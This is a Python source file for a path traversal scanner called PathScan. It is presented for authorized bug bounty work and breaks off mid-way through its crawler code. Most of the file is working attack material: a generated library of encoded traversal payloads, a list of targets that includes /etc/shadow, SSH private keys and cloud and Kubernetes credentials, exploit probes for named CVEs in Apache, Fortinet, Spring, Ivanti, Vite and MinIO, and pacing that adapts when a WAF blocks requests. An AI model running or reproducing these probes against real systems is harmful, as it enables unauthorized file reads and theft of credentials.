#!/usr/bin/env python3
"""
================================================================================
PathScan v3.0 — Path Traversal Detection Engine (Bug Bounty Edition)
================================================================================

AUTHORIZED USE ONLY. Only run against:
  - Your own infrastructure
  - Assets explicitly in-scope under a published bug bounty / VDP program

Unauthorized scanning is illegal under the CFAA, Computer Misuse Act,
and equivalent laws worldwide. The --i-have-authorization flag is not
a waiver — you are responsible for confirming scope before running.

Coverage:
  - Full HTML crawler: discovers links, forms, JS routes automatically
  - 100+ payloads: all encoding variants, OS-specific, depth-variable
  - All injection surfaces: query, route, body, JSON, header, cookie,
    multipart/file-upload, referer, X-* headers
  - CVE-targeted probes: Apache CVE-2021-41773/42013, Spring CVE-2024-38819
    / CVE-2025-41242, Fortinet CVE-2018-13379 / CVE-2025-64446, Ivanti
    CVE-2024-10811/13159/13160/13161, Vite CVE-2025-30208, and more
  - WAF detection + automatic backoff
  - Blind timing oracle (LOW confidence, flagged separately)
  - Dedup + triage scoring
  - Resume/checkpoint support
  - Reports: Markdown + JSON + HTML (PortSwigger-lab-compatible)
================================================================================
"""

import os
import sys
import re
import json
import time
import hashlib
import logging
import argparse
import difflib
import threading
import queue
from urllib.parse import (
    urlparse, parse_qs, urlencode, urlunparse,
    urljoin, quote, unquote
)
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime, timezone

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] Install dependencies: pip install requests beautifulsoup4 colorama")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False

# ─────────────────────────────────────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    datefmt="%H:%M:%S",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("PathScan")

def _c(color_code, text):
    if COLOR:
        return f"{color_code}{text}{Style.RESET_ALL}"
    return text

def log_info(msg):  logger.info(_c(Fore.CYAN,   f"[*] {msg}") if COLOR else f"[*] {msg}")
def log_good(msg):  logger.info(_c(Fore.GREEN,  f"[+] {msg}") if COLOR else f"[+] {msg}")
def log_warn(msg):  logger.info(_c(Fore.YELLOW, f"[!] {msg}") if COLOR else f"[!] {msg}")
def log_hit(msg):   logger.info(_c(Fore.RED,    f"[FOUND] {msg}") if COLOR else f"[FOUND] {msg}")
def log_err(msg):   logger.info(_c(Fore.RED,    f"[ERR] {msg}") if COLOR else f"[ERR] {msg}")


# ─────────────────────────────────────────────────────────────────────────────
# DEFAULT USER AGENT
# ─────────────────────────────────────────────────────────────────────────────
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 PathScan/3.0"


# ─────────────────────────────────────────────────────────────────────────────
# FILE PARAMETER KEYWORDS — expands on every name seen in real-world CVEs
# ─────────────────────────────────────────────────────────────────────────────
FILE_PARAM_KEYWORDS = {
    "file", "filename", "file_name", "filepath", "file_path",
    "path", "dir", "directory", "folder",
    "img", "image", "photo", "picture", "avatar", "thumbnail", "icon",
    "doc", "document", "pdf", "report", "export", "download", "attachment",
    "view", "preview", "read", "open", "load", "fetch", "get",
    "src", "source", "data", "content", "body", "input",
    "url", "uri", "link", "href", "ref", "resource",
    "page", "template", "theme", "layout", "skin", "style",
    "include", "inc", "require", "import", "module",
    "cfg", "conf", "config", "settings", "options",
    "log", "logs", "debug", "trace", "backup",
    "name", "target", "dest", "destination", "base",
    "media", "asset", "static", "public",
    "archive", "zip", "tar", "gz",
    "script", "js", "css",
}


# ─────────────────────────────────────────────────────────────────────────────
# SENSITIVE FILE TARGETS
# Key targets for Linux, Windows, macOS, cloud/container environments,
# and common web stacks — drawn from real-world CVE exploitation reports
# ─────────────────────────────────────────────────────────────────────────────
SENSITIVE_FILES = {
    "linux": [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/os-release",
        "/etc/issue",
        "/etc/resolv.conf",
        "/etc/fstab",
        "/etc/crontab",
        "/etc/sudoers",
        "/etc/group",
        "/etc/ssh/sshd_config",
        "/etc/ssh/ssh_host_rsa_key",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/maps",
        "/proc/self/fd/0",
        "/proc/version",
        "/proc/net/tcp",
        "/proc/net/arp",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/root/.bash_history",
        "/root/.ssh/id_rsa",
        "/root/.ssh/authorized_keys",
        "/home/user/.bash_history",
    ],
    "windows": [
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\Windows\\repair\\SAM",
        "C:\\boot.ini",
        "C:\\Windows\\System32\\eula.txt",
        "C:\\Windows\\debug\\NetSetup.log",
        "\\Windows\\win.ini",
        "\\inetpub\\wwwroot\\web.config",
    ],
    "web": [
        ".env",
        ".env.local",
        ".env.production",
        "config.php",
        "configuration.php",
        "wp-config.php",
        "config.yml",
        "config.yaml",
        "config.json",
        "database.yml",
        "settings.py",
        "local_settings.py",
        "application.properties",
        "application.yml",
        "appsettings.json",
        "web.config",
        ".htaccess",
        ".htpasswd",
        "composer.json",
        "package.json",
        "Gemfile",
        "requirements.txt",
        "Dockerfile",
        "docker-compose.yml",
        "id_rsa",
        "id_rsa.pub",
    ],
    "cloud": [
        "/var/lib/cloud/instance/user-data.txt",
        "/run/secrets/kubernetes.io/serviceaccount/token",
        "/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/.docker/config.json",
        "/root/.aws/credentials",
        "/root/.azure/credentials",
        "/root/.config/gcloud/credentials.db",
    ],
}


# ─────────────────────────────────────────────────────────────────────────────
# ORACLE PATTERNS — confirmed file content fingerprints
# ─────────────────────────────────────────────────────────────────────────────
ORACLE_PATTERNS = [
    # Linux passwd/shadow
    (re.compile(r"root:x:\d+:\d+:"),                              "linux_passwd",       "HIGH"),
    (re.compile(r"root:\$[0-9a-z$]+\$"),                         "linux_shadow",       "HIGH"),
    (re.compile(r"daemon:x:\d+:\d+:"),                           "linux_passwd",       "HIGH"),
    # Windows files
    (re.compile(r"\[boot loader\]", re.I),                       "windows_ini",        "HIGH"),
    (re.compile(r"\[extensions\]", re.I),                        "windows_ini",        "HIGH"),
    (re.compile(r"\[fonts\]", re.I),                             "windows_ini",        "HIGH"),
    (re.compile(r"\[drivers\]", re.I),                           "windows_ini",        "HIGH"),
    (re.compile(r"for 16-bit app support", re.I),                "windows_ini",        "HIGH"),
    # Hosts file
    (re.compile(r"127\.0\.0\.1\s+localhost"),                    "linux_hosts",        "HIGH"),
    # /proc/self/environ
    (re.compile(r"HOME=/(?:root|home)"),                         "proc_environ",       "HIGH"),
    (re.compile(r"(PATH|USER|SHELL|PWD)=[^\x00\n]+"),           "proc_environ",       "HIGH"),
    # SSH keys
    (re.compile(r"-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----"), "ssh_private_key",   "HIGH"),
    # .env files
    (re.compile(r"[A-Z_]+=.{1,200}", re.M),                     "env_file",           "MEDIUM"),
    (re.compile(r"(DB_PASSWORD|SECRET_KEY|API_KEY|AWS_)=\S+"),  "env_credentials",    "HIGH"),
    # web.config / config files
    (re.compile(r"<connectionStrings>", re.I),                   "web_config",         "HIGH"),
    (re.compile(r"connectionString=.{10,100}", re.I),           "web_config",         "HIGH"),
    # wp-config.php
    (re.compile(r"define\s*\(\s*'DB_PASSWORD'", re.I),          "wp_config",          "HIGH"),
    # Spring application.properties
    (re.compile(r"spring\.datasource\.password\s*="),           "spring_config",      "HIGH"),
    # Kubernetes service account token (JWT)
    (re.compile(r"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9"),     "k8s_token",          "HIGH"),
    # AWS credentials
    (re.compile(r"aws_access_key_id\s*=\s*AK[A-Z0-9]{18}"),    "aws_creds",          "HIGH"),
    # Docker config
    (re.compile(r'"auths"\s*:\s*\{'),                            "docker_config",      "HIGH"),
]

# Error signatures — MEDIUM confidence
ERROR_SIGNATURES = [
    "java.io.FileNotFoundException",
    "java.io.IOException",
    "java.lang.IllegalArgumentException",
    "ENOENT: no such file or directory",
    "No such file or directory",
    "open() failed",
    "fopen(",
    "Warning: file_get_contents(",
    "Warning: include(",
    "Warning: require(",
    "failed to open stream",
    "io/ioutil.ReadFile",
    "os.Open(",
    "PathTraversalException",
    "FileExistsException",
    "InvalidPathException",
    "DirectoryNotFoundException",
    "System.IO.IOException",
    "System.IO.FileNotFoundException",
    "System.UnauthorizedAccessException",
    "Permission denied",
    "Access is denied",
    "The system cannot find the file",
    "The filename, directory name, or volume label syntax is incorrect",
    "cannot open file",
    "Failed to load resource",
    # Spring-specific
    "org.springframework.web.servlet",
    "ResourceHttpRequestHandler",
    # Nginx/Apache
    "No such file or directory",
    "directory index forbidden",
]


# ─────────────────────────────────────────────────────────────────────────────
# CVE-SPECIFIC PROBES
# Each entry: (cve_id, description, method, path_template, headers, check_fn)
# check_fn(response) → bool
# ─────────────────────────────────────────────────────────────────────────────
def _has_passwd(r):
    return bool(re.search(r"root:x:\d+:\d+:", r.text))

def _has_win_ini(r):
    return bool(re.search(r"\[fonts\]|\[extensions\]|\[boot loader\]", r.text, re.I))

def _has_env(r):
    return bool(re.search(r"(HOME|PATH|USER|SHELL|SECRET|PASSWORD)=", r.text))

def _status_ok(r):
    return r.status_code == 200 and len(r.content) > 50

CVE_PROBES = [
    # ── Apache HTTP Server ──────────────────────────────────────────────────
    {
        "cve": "CVE-2021-41773",
        "desc": "Apache 2.4.49 URL-encoded path traversal + RCE via CGI",
        "method": "GET",
        "paths": [
            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            "/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        ],
        "headers": {},
        "check": _has_passwd,
        "target_file": "/etc/passwd",
    },
    {
        "cve": "CVE-2021-42013",
        "desc": "Apache 2.4.50 bypass (incomplete fix for CVE-2021-41773)",
        "method": "GET",
        "paths": [
            "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
            "/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
            "/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        ],
        "headers": {},
        "check": _has_passwd,
        "target_file": "/etc/passwd",
    },
    # ── Fortinet FortiOS / FortiGate ────────────────────────────────────────
    {
        "cve": "CVE-2018-13379",
        "desc": "Fortinet FortiGate SSL VPN arbitrary file read",
        "method": "GET",
        "paths": [
            "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
        ],
        "headers": {},
        "check": lambda r: r.status_code == 200 and len(r.content) > 50,
        "target_file": "sslvpn_websession",
    },
    {
        "cve": "CVE-2022-42475",
        "desc": "Fortinet FortiOS heap overflow / path traversal in SSL-VPN",
        "method": "GET",
        "paths": [
            "/api/v2/cmdb/system/admin?vdom=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        ],
        "headers": {"Content-Type": "application/json"},
        "check": _has_passwd,
        "target_file": "/etc/passwd",
    },
    {
        "cve": "CVE-2025-64446",
        "desc": "Fortinet FortiWeb auth bypass + path traversal via encoded /api/v2.0/",
        "method": "GET",
        "paths": [
            "/api/v2.0/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/api/v2.0/..%2F..%2F..%2Fetc%2Fpasswd",
            "/api/v2.0/%252e%252e/%252e%252e/etc/passwd",
        ],
        "headers": {},
        "check": _has_passwd,
        "target_file": "/etc/passwd",
    },
    # ── Spring Framework ────────────────────────────────────────────────────
    {
        "cve": "CVE-2024-38819",
        "desc": "Spring WebMvc.fn / WebFlux.fn static resource path traversal",
        "method": "GET",
        "paths": [
            "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/resources/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/assets/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/webjars/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/static/..%2F..%2F..%2Fetc%2Fpasswd",
        ],
        "headers": {},
        "check": _has_passwd,
        "target_file": "/etc/passwd",
    },
    {
        "cve": "CVE-2025-41242",
        "desc": "Spring MVC path traversal on non-compliant servlet containers via /%2e%2e/",
        "method": "GET",
        "paths": [
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/%2e%2e/%2e%2e/WEB-INF/web.xml",
            "/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
        ],
        "headers": {},
        "check": lambda r: _has_passwd(r) or (r.status_code == 200 and "web-app" in r.text.lower()),
        "target_file": "/etc/passwd",
    },
    # ── Ivanti ──────────────────────────────────────────────────────────────
    {
        "cve": "CVE-2024-10811",
        "desc": "Ivanti Endpoint Manager absolute path traversal (CVSS 9.8)",
        "method": "GET",
        "paths": [
            "/landesk/managementsuite/core/core.DataAccessLayerProcessorPOST.asmx/../../../../../../etc/passwd",
            "/ams/agent/../../../../../../../etc/passwd",
        ],
        "headers": {},
        "check": _has_passwd,
        "target_file": "/etc/passwd",
    },
    {
        "cve": "CVE-2024-13159",
        "desc": "Ivanti EPM absolute path traversal variant B",
        "method": "GET",
        "paths": [
            "/wsStatusList?file=../../../etc/passwd",
            "/mdm/checkin?file=../../../../etc/passwd",
        ],
        "headers": {},
        "check": _has_passwd,
        "target_file": "/etc/passwd",
    },
    # ── Vite Dev Server ─────────────────────────────────────────────────────
    {
        "cve": "CVE-2025-30208",
        "desc": "Vite dev server arbitrary file read via @fs alias bypass",
        "method": "GET",
        "paths": [
            "/@fs/etc/passwd",
            "/@fs//etc/passwd",
            "/@fs/../../../../etc/passwd",
            "/@fs/etc/shadow",
            "/@fs/.env",
        ],
        "headers": {},
        "check": lambda r: _has_passwd(r) or _has_env(r),
        "target_file": "/etc/passwd",
    },
    # ── Next.js ─────────────────────────────────────────────────────────────
    {
        "cve": "CVE-2024-34351",
        "desc": "Next.js SSRF / header injection leading to internal path access",
        "method": "GET",
        "paths": [
            "/_next/static/../../../etc/passwd",
            "/_next/image?url=file:///etc/passwd&w=8&q=75",
        ],
        "headers": {"Host": "localhost"},
        "check": _has_passwd,
        "target_file": "/etc/passwd",
    },
    # ── Nginx alias misconfiguration ────────────────────────────────────────
    {
        "cve": "NGINX-ALIAS-TRAVERSAL",
        "desc": "Nginx off-by-slash alias misconfiguration (not a CVE but ubiquitous)",
        "method": "GET",
        "paths": [
            "/static../etc/passwd",
            "/files../etc/passwd",
            "/assets../etc/passwd",
            "/images../etc/passwd",
            "/uploads../etc/passwd",
        ],
        "headers": {},
        "check": _has_passwd,
        "target_file": "/etc/passwd",
    },
    # ── IIS Tilde / Short Name ──────────────────────────────────────────────
    {
        "cve": "IIS-TILDE-ENUM",
        "desc": "IIS 8.3 short filename enumeration via tilde",
        "method": "GET",
        "paths": [
            "/aspnet~1/",
            "/web~1.con",
            "/iissta~1/",
        ],
        "headers": {},
        "check": lambda r: r.status_code in [200, 403],
        "target_file": "IIS tilde",
    },
    # ── Ghost CMS ───────────────────────────────────────────────────────────
    {
        "cve": "CVE-2023-32235",
        "desc": "Ghost CMS path traversal via /assets/built/../../",
        "method": "GET",
        "paths": [
            "/assets/built/../../package.json",
            "/assets/built/../../config.production.json",
            "/assets/built/../../.env",
        ],
        "headers": {},
        "check": lambda r: r.status_code == 200 and (
            "name" in r.text.lower() or "version" in r.text.lower()
        ),
        "target_file": "package.json",
    },
    # ── Argo Workflows (Zip Slip) ────────────────────────────────────────────
    {
        "cve": "CVE-2025-62156",
        "desc": "Argo Workflows Zip Slip via artifact extraction — check for upload endpoints",
        "method": "GET",
        "paths": [
            "/api/v1/artifact-files",
            "/api/v1/workflows",
        ],
        "headers": {},
        "check": lambda r: r.status_code in [200, 401, 403],
        "target_file": "artifact API surface",
    },
    # ── MinIO ────────────────────────────────────────────────────────────────
    {
        "cve": "CVE-2023-28432",
        "desc": "MinIO information disclosure — exposes env vars including credentials",
        "method": "POST",
        "paths": ["/minio/health/cluster", "/minio/login"],
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "check": lambda r: any(k in r.text.upper() for k in [
            "MINIO_SECRET_KEY", "MINIO_ROOT_PASSWORD", "AWS_SECRET"
        ]),
        "target_file": "MinIO env vars",
    },
]


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD GENERATION
# Builds a comprehensive payload list dynamically:
# depths 1-8 × all encoding variants × Linux + Windows targets
# ─────────────────────────────────────────────────────────────────────────────
def _gen_payloads():
    """
    Generate all traversal payload variants for a configurable range of depths.
    Each payload dict: { vector, os, category, desc }
    """
    payloads = []

    linux_files  = ["/etc/passwd", "/etc/hosts", "/proc/self/environ"]
    windows_files = ["windows\\win.ini", "windows\\System32\\drivers\\etc\\hosts"]

    # ── Standard depth variants ──────────────────────────────────────────────
    for depth in range(1, 9):
        dots = "../" * depth

        for f in linux_files:
            payloads.append({
                "vector": dots + f.lstrip("/"),
                "os": "linux", "category": "standard",
                "desc": f"Standard depth-{depth}",
            })
        for f in windows_files:
            payloads.append({
                "vector": ("..\\" * depth) + f,
                "os": "windows", "category": "standard",
                "desc": f"Windows backslash depth-{depth}",
            })

    # ── Non-recursive strip bypass  (....// removes to ../) ─────────────────
    for depth in range(2, 7):
        segment = "..../" * depth
        for f in linux_files:
            payloads.append({
                "vector": segment + "." + f,
                "os": "linux", "category": "non_recursive",
                "desc": f"Non-recursive bypass depth-{depth}",
            })

    # ── Split dot injection  (..././) ────────────────────────────────────────
    for depth in range(2, 6):
        segment = "..././" * depth
        for f in linux_files:
            payloads.append({
                "vector": segment + f.lstrip("/"),
                "os": "linux", "category": "split_dot",
                "desc": f"Split-dot depth-{depth}",
            })

    # ── URL-encoded variants ─────────────────────────────────────────────────
    encoded_variants = [
        ("%2e%2e%2f",       "url_single"),
        ("%2e%2e/",         "url_half"),
        ("..%2f",           "url_slash_only"),
        ("%2e%2e%5c",       "url_backslash"),
        ("%252e%252e%252f", "url_double"),
        ("%252e%252e/",     "url_double_half"),
        ("%2e%2e%252f",     "url_mixed"),
    ]
    for depth in range(2, 6):
        for enc, label in encoded_variants:
            segment = enc * depth
            payloads.append({
                "vector": segment + "etc/passwd",
                "os": "linux", "category": "encoded",
                "desc": f"{label} depth-{depth}",
            })

    # ── Overlong UTF-8 (..%c0%af) ───────────────────────────────────────────
    for depth in range(2, 5):
        segment = ("..%c0%af" * depth)
        payloads.append({
            "vector": segment + "etc/passwd",
            "os": "linux", "category": "utf8_overlong",
            "desc": f"Overlong UTF-8 depth-{depth}",
        })
        payloads.append({
            "vector": ("..%c1%9c" * depth) + "etc/passwd",
            "os": "linux", "category": "utf8_overlong",
            "desc": f"Overlong UTF-8 alt depth-{depth}",
        })

    # ── Unicode full-width separators ────────────────────────────────────────
    payloads += [
        {"vector": "..%EF%BC%8F..%EF%BC%8F..%EF%BC%8Fetc/passwd",
         "os": "linux", "category": "unicode", "desc": "Unicode full-width slash"},
        {"vector": "..%E2%80%8B..%E2%80%8B..%E2%80%8Betc/passwd",
         "os": "linux", "category": "unicode", "desc": "Unicode zero-width space"},
        {"vector": "..%u002f..%u002f..%u002fetc/passwd",
         "os": "linux", "category": "unicode", "desc": "Unicode %u-encoded slash (IIS)"},
        {"vector": "..%u2215..%u2215..%u2215etc/passwd",
         "os": "linux", "category": "unicode", "desc": "Unicode division slash"},
    ]

    # ── Null byte termination ────────────────────────────────────────────────
    for ext in [".jpg", ".png", ".gif", ".pdf", ".txt", ".php"]:
        for depth in [3, 4, 5]:
            payloads.append({
                "vector": ("../" * depth) + f"etc/passwd%00{ext}",
                "os": "linux", "category": "null_byte",
                "desc": f"Null byte + {ext} depth-{depth}",
            })

    # ── Absolute path override ────────────────────────────────────────────────
    for f in linux_files:
        payloads.append({"vector": f, "os": "linux", "category": "absolute",
                         "desc": "Absolute path"})
    for f in ["/etc/passwd", "/etc/shadow", "/proc/self/environ"]:
        payloads.append({"vector": f"file://{f}", "os": "linux",
                         "category": "absolute", "desc": "file:// scheme"})

    # ── Mixed separators (Windows) ────────────────────────────────────────────
    payloads += [
        {"vector": "..\\..\\..\\windows\\win.ini",
         "os": "windows", "category": "mixed_sep", "desc": "Mixed sep backslash"},
        {"vector": "..%5c..%5c..%5cwindows%5cwin.ini",
         "os": "windows", "category": "mixed_sep", "desc": "URL-encoded backslash"},
        {"vector": "..%255c..%255c..%255cwindows%255cwin.ini",
         "os": "windows", "category": "mixed_sep", "desc": "Double URL-encoded backslash"},
        {"vector": "..\\/..\\/..\\/windows\\/win.ini",
         "os": "windows", "category": "mixed_sep", "desc": "Mixed fwd+back slash"},
    ]

    # ── Spring-specific encoded sequences (CVE-2024-38819 / CVE-2025-41242) ──
    payloads += [
        {"vector": "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
         "os": "linux", "category": "spring_cve", "desc": "Spring single-encoded %2e%2e/"},
        {"vector": "..%2F..%2F..%2Fetc%2Fpasswd",
         "os": "linux", "category": "spring_cve", "desc": "Spring half-encoded slash"},
        {"vector": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
         "os": "linux", "category": "spring_cve", "desc": "Spring double-encoded full"},
        {"vector": "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
         "os": "linux", "category": "spring_cve", "desc": "Spring leading slash + %2e"},
    ]

    # ── Apache-specific (CVE-2021-41773 / 42013) ─────────────────────────────
    payloads += [
        {"vector": ".%2e/.%2e/.%2e/.%2e/etc/passwd",
         "os": "linux", "category": "apache_cve", "desc": "Apache .%2e mixed depth-4"},
        {"vector": ".%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
         "os": "linux", "category": "apache_cve", "desc": "Apache .%2e variant"},
        {"vector": "%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
         "os": "linux", "category": "apache_cve", "desc": "Apache double-encoded (42013)"},
    ]

    # ── Path truncation ───────────────────────────────────────────────────────
    payloads += [
        {"vector": "A" * 100 + "/../" * 5 + "etc/passwd",
         "os": "linux", "category": "truncation", "desc": "Long prefix truncation"},
        {"vector": "..../" * 10 + "etc/passwd",
         "os": "linux", "category": "truncation", "desc": "Extended ..../ chain"},
    ]

    # ── Base64 encoding (seen in some custom parsers) ─────────────────────────
    import base64
    for f in ["/etc/passwd", "../../../etc/passwd"]:
        b64 = base64.b64encode(f.encode()).decode()
        payloads.append({"vector": b64, "os": "linux",
                         "category": "base64", "desc": f"Base64 encoded {f}"})

    # Deduplicate by vector string
    seen = set()
    deduped = []
    for p in payloads:
        if p["vector"] not in seen:
            seen.add(p["vector"])
            deduped.append(p)

    return deduped


ALL_PAYLOADS = _gen_payloads()
log_info(f"Payload library: {len(ALL_PAYLOADS)} unique traversal vectors loaded")


# ─────────────────────────────────────────────────────────────────────────────
# SCOPE VALIDATOR
# ─────────────────────────────────────────────────────────────────────────────
class ScopeValidator:
    def __init__(self, seed_url, extra_domains=None):
        parsed = urlparse(seed_url)
        self.seed_netloc = parsed.netloc
        self.allowed = {parsed.netloc}
        if extra_domains:
            self.allowed.update(extra_domains)

    def is_in_scope(self, url):
        try:
            netloc = urlparse(url).netloc
            if netloc in self.allowed:
                return True
            for d in self.allowed:
                if netloc.endswith("." + d):
                    return True
        except Exception:
            pass
        return False

    def same_host(self, url):
        try:
            return urlparse(url).netloc == self.seed_netloc
        except Exception:
            return False


# ─────────────────────────────────────────────────────────────────────────────
# WAF DETECTOR
# ─────────────────────────────────────────────────────────────────────────────
WAF_SIGNATURES = {
    "Cloudflare":   ["CF-RAY", "__cfduid", "cloudflare", "cf-cache-status"],
    "Akamai":       ["AkamaiGHost", "akamai", "X-Check-Cacheable"],
    "AWS WAF":      ["X-AMZ-CF-ID", "x-amz-request-id"],
    "ModSecurity":  ["Mod_Security", "NOYB", "mod_security"],
    "F5 BIG-IP":    ["X-WA-Info", "BigIP", "F5"],
    "Imperva":      ["X-Iinfo", "incap_ses", "visid_incap", "Incapsula"],
    "Fortinet":     ["FORTIWAFSID", "Fortigate"],
    "Barracuda":    ["barra_counter_session", "BNI__BARRACUDA_LB_COOKIE"],
    "Sucuri":       ["x-sucuri-id", "sucuri-clientside"],
    "Fastly":       ["X-Served-By", "X-Cache", "Fastly"],
    "Generic 403":  [],
}

class WAFDetector:
    def __init__(self):
        self.detected = None
        self.block_threshold = 3  # consecutive blocks before backing off
        self._consecutive_blocks = 0
        self._lock = threading.Lock()

    def check(self, response):
        """Returns WAF name if detected, None otherwise."""
        if response is None:
            return None
        headers_str = " ".join(f"{k}:{v}" for k, v in response.headers.items()).lower()
        body_lower = response.text[:500].lower()
        for waf, sigs in WAF_SIGNATURES.items():
            if sigs and any(s.lower() in headers_str or s.lower() in body_lower for s in sigs):
                return waf
        return None

    def record_block(self, response):
        """Call when a 403/406/429 is received; returns True if we should slow down."""
        with self._lock:
            self._consecutive_blocks += 1
            return self._consecutive_blocks >= self.block_threshold

    def record_success(self):
        with self._lock:
            self._consecutive_blocks = max(0, self._consecutive_blocks - 1)


# ─────────────────────────────────────────────────────────────────────────────
# REQUEST MANAGER
# ─────────────────────────────────────────────────────────────────────────────
class RequestManager:
    def __init__(self, cookies=None, auth_header=None, custom_headers=None,
                 rps=5, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        self.rps = max(rps, 1)
        self.base_delay = 1.0 / self.rps
        self.current_delay = self.base_delay
        self._lock = threading.Lock()
        self._last_req = 0.0
        self.waf = WAFDetector()

        self.session.headers.update({"User-Agent": DEFAULT_UA})
        if auth_header:
            self.session.headers["Authorization"] = auth_header
        if custom_headers:
            self.session.headers.update(custom_headers)
        if cookies:
            for part in cookies.split(";"):
                if "=" in part:
                    k, v = part.strip().split("=", 1)
                    self.session.cookies.set(k.strip(), v.strip())
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def _throttle(self):
        with self._lock:
            elapsed = time.time() - self._last_req
            wait = self.current_delay - elapsed
            if wait > 0:
                time.sleep(wait)
            self._last_req = time.time()

    def execute(self, method, url, extra_headers=None, **kwargs):
        """Send request with throttle, CSRF sync, WAF backoff, retry."""
        self._throttle()

        # Merge auto-headers with any caller-supplied headers dict
        auto_headers = {}
        if "XSRF-TOKEN" in self.session.cookies:
            auto_headers["X-XSRF-TOKEN"] = self.session.cookies["XSRF-TOKEN"]
        if extra_headers:
            auto_headers.update(extra_headers)
        # Merge with kwargs["headers"] if caller also passed headers
        if "headers" in kwargs:
            merged = dict(auto_headers)
            merged.update(kwargs.pop("headers"))
            auto_headers = merged

        for attempt in range(4):
            try:
                resp = self.session.request(
                    method, url, timeout=12,
                    headers=auto_headers if auto_headers else None,
                    allow_redirects=True,
                    **kwargs
                )
                # WAF detection
                waf_name = self.waf.check(resp)
                if waf_name and not self.waf.detected:
                    self.waf.detected = waf_name
                    log_warn(f"WAF detected: {waf_name} — will adapt request pacing")

                if resp.status_code in [403, 406, 429]:
                    should_slow = self.waf.record_block(resp)
                    if should_slow:
                        self.current_delay = min(self.current_delay * 2.5, 10.0)
                        log_warn(f"WAF blocking — backing off to {self.current_delay:.1f}s delay")
                else:
                    self.waf.record_success()
                    self.current_delay = max(self.current_delay * 0.9, self.base_delay)

                return resp
            except requests.RequestException as e:
                if attempt == 3:
                    log_err(f"Network failure {url}: {e}")
                    return None
                time.sleep(2 ** attempt)
        return None


# ─────────────────────────────────────────────────────────────────────────────
# CRAWLER
# Discovers endpoints, parameters, forms, JS routes, and API paths
# ─────────────────────────────────────────────────────────────────────────────
class Crawler:
    def __init__(self, req_mgr, scope, max_pages=150):
        self.req = req_mgr
        self.scope = scope
        self.max_pages = max_pages
        self._visited = set()
        self._queue = queue.Queue()
        self.endpoints = []    # list of dicts: {url, params, method, location, source}

    def crawl(self, seed_url):
        """BFS crawl from seed_url. Returns list of endpoint dicts."""
        log_info(f"Starting crawl from {seed_url} (max {self.max_pages} pages)")
        self._queue.put(seed_url)

        while not self._queue.empty() and len(self._visited) < self.max_pages:
            url = self._queue.get()
            if url in self._visited:
                continue
            if not self.scope.is_in_scope(url):
                continue
            self._visited.add(url)

            resp = self.req.execute("GET", url)
            if not resp:
                continue

            content_type = resp.headers.get("Content-Type", "")

            if "javascript" in content_type or url.endswith(".js"):
                self._parse_js(url, resp.text)
            elif "html" in content_type or not any(
                url.endswith(e) for e in [".css", ".png", ".jpg", ".gif", ".ico", ".woff"]
            ):
                self._parse_html(url, resp.text)

            # Always extract query params from URL itself
            self._register_url_params(url)

        log_good(f"Crawl complete: {len(self._visited)} pages → {len(self.endpoints)} injection points discovered")
        return self.endpoints

    def _register_url_params(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if params:
            self.endpoints.append({
                "url": url, "params": list(params.keys()),
                "method": "GET", "location": "query",
                "source": "url_param",
            })

    def _parse_html(self, base_url, html):
        if not BS4_AVAILABLE:
            self._parse_html_regex(base_url, html)
            return

        soup = BeautifulSoup(html, "html.parser")

        # ── Links ──
        for tag in soup.find_all(["a", "link"], href=True):
            href = tag["href"].strip()
